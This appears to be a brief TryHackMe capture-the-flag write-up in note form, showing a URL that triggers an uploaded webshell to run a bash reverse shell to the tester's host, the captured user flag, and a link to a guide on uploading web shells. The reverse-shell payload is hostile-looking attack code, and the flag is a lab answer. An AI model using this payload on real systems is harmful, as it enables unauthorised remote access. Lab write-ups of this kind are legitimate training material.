-----------
- Tags:  #writeup #info #thm  #tutorial #github 
-----------

```bash
http://10.10.45.144/uploads/webshell.php.test?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.6.80.197/443%200%3E%261%27
```

- ## Flag User1:
THM{y0u_g0t_a_sh3ll}


- ## Flag Root:


## Recurso WebSHELL
https://github.com/lamontns/pentest/blob/master/exploitation/web-application/server-side-vulnerabilities/uploading-web-shells.md

